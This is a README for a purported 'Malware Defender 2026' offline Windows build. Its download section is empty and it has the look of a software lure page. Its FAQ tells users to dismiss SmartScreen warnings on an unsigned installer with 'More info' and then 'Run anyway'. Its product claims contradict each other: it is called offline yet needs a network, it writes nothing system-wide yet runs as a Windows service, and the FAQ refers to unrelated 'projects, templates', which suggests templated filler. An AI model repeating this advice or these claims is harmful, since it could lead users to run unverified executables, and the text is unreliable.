🔒 Malware Defender 2026: Standalone Offline Build for Windows 11

 

 

 📦 Intro

This repository publishes a standalone offline build for the Malware Defender workflow on Windows 10 and 11. The distribution package is a self-contained x64 bundle that carries the runtime, the scanning engine components, and the definition update mechanism in a single deployment archive, so an operator can stage the whole environment without reaching out to external networks during setup.

The build targets environments where bandwidth is scarce, endpoints are isolated from the public internet, or reproducibility of the deployed configuration matters more than convenience. System administrators, lab operators, and forensic technicians use it to reproduce identical scan profiles across machines without having to reconcile against an online installer that drifts with every vendor push.

A single Malware Defender on Windows deployment covers both portable and installed modes, with definition packages distributed alongside the binary in the same archive so that the offline posture is preserved between updates.

 01 · ⬇️ Download

 
 
 
 
 
 
 
 

 
 
 

 02 · ✨ Features

 
 
 

 🗂️ Self-contained archive 

Single deployment bundle with runtime, engine, and definitions, no external fetch required after extraction.

 
 

 🛡️ Offline definition staging 

Definition packages ship inside the archive and can be rotated into the local store on a controlled cadence.

 
 

 📁 Portable and installed modes 

The same archive supports a portable execution path or a per-user install with shortcut registration.

 
 
 
 

 🔍 Local scan engine 

Signature and heuristic inspection runs entirely on the host, with no outbound reporting channel.

 
 

 📝 Reproducible deployment 

Versioned release tags map to fixed archive hashes so that operators can pin a specific build state.

 
 

 ⚙️ Configuration surface 

Policy files and scan profiles live in a plain-text layout that can be version controlled alongside the build.

 
 
 

 03 · ⚙️ How it works

The installer delivers an application directory under the per-user program path, a configuration tree under the user profile, and a definitions store that is seeded at unpack time. Nothing is written to Windows system directories, and the archive does not register global shell extensions.

On first launch the build registers its file associations and Start menu entry inside the per-user hive, then initializes a default policy file. If a policy file already exists from a previous deployment it is left untouched, so re-running the build over an existing install preserves the operator's configuration.

Runtime operation does not require network access. Signature refreshes are applied by dropping a newer definition package into the store and restarting the engine, which is deliberate for environments that gate egress through a jump host or a scheduled transfer window.

Integration with the Windows host is limited to the per-user registry hive, a small set of shell entries, and the file association table for scan targets. The build coexists cleanly with other security tooling on the same machine, portable and installed modes can be present side by side, and the file association handler can be reassigned without reinstalling.

 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64, including Pro, Enterprise, and the LTSC channels. Older Windows releases and any 32-bit target are out of scope. Specific minimum build numbers are listed in the release notes accompanying each tagged archive.

The installer scripts run under Windows PowerShell 5.1 and PowerShell 7 or later. Only built-in cmdlets are used for extraction and per-user registration, so no additional PowerShell modules need to be provisioned on the target host.

The build runs on commodity x64 hardware and is comfortable on a recent dual-core CPU with modest RAM and a few gigabytes of disk for the archive plus definition store. Heavier scan profiles benefit from additional memory, but the base deployment does not impose a hard floor.

Coexistence with other antimalware tooling is supported as long as a single scanner owns real-time inspection at any one time. Portable mode leaves no registry footprint; installed mode writes only to the per-user hive. File association for scan targets can be remapped at any time from the configuration file.

 05 · 🔧 Requirements

 Component Supported Preferred 
 --- --- --- 
 OS Windows 10 Windows 11 
 Shell PowerShell 5.1+ PowerShell 7+ 
 Network Required to download Stable broadband 
 Privileges Standard user access Standard user access 

 06 · ❓ FAQ

 🔒 Is this standalone build safe to install on Windows?

 [!CAUTION]
 On first run, Windows SmartScreen may warn for unsigned installers. Click More info , then Run anyway to continue. The build is an offline setup file; keep your antivirus enabled as usual.

 🪟 Which Windows versions does the build support?

 [!NOTE]
 The build runs on Windows 10 and Windows 11 on x64. Older Windows releases and 32-bit targets are not supported.

 📡 Can I use the build offline?

 [!TIP]
 Yes. After install, the build runs without a network connection. Only the initial retrieval step needs internet access.

 🔄 How do updates work?

 [!NOTE]
 Updates ship as a newer versioned installer; running it over the existing install preserves your projects, templates, and preferences. No separate updater service is required.

 🗑️ How do I uninstall it on Windows?

 [!WARNING]
 Open Settings, then Apps, then Installed apps, find the entry in the list, and choose Uninstall. Personal project files remain on disk unless you remove them manually.

 ⚙️ What are the technical specifications?

 [!IMPORTANT]
 - System load: The engine runs as a native Windows service and idles at a low CPU footprint outside of active scans.
 - File formats: Reads PE binaries, scripts, archives, and common document containers, and writes JSON scan reports and CSV summari
